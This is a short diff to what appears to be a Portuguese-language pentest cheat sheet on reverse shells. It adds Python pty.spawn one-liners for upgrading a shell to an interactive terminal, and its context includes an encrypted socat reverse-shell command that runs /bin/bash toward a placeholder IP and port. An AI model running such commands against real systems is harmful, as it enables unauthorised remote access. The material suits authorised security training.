@@ -37,6 +37,13 @@ socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash
 ---
 
 # 🔥 Melhorando Shells
+## 🛠️ Melhorando Shells
+```bash
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+```
+```bash
+python -c 'import pty;pty.spawn("/bin/bash")'
+```
 ## 🪟Windows
 ```bash
 apt install rlwrap
